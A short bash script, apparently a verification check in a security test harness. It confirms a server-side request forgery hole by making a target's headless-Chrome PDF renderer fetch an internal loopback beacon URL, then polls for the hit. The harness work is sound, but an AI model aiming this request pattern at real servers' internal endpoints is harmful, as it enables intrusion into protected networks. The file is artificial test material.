#!/usr/bin/env bash
# SSRF-001: SSRF via headless-chrome PDF rendering. The server renders an
# attacker-supplied URL to PDF, so chrome fetches an internal loopback URL (the
# beacon) on the server's behalf. The container-side port stays :3000.
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
tok="ssrf-${RANDOM}-$$"
curl -s -X POST "$TARGET/api/render/pdf" -H 'content-type: application/json' \
  -d "{\"url\":\"http://127.0.0.1:3000/api/_verify/ssrf-beacon?token=$tok\"}" >/dev/null
rc=1
for _ in $(seq 1 20); do
  if curl -s -H "$VT" "$TARGET/api/_verify/ssrf-check?token=$tok" | grep -q '"hit":true'; then
    rc=0
    break
  fi
  sleep 1
done
exit $rc
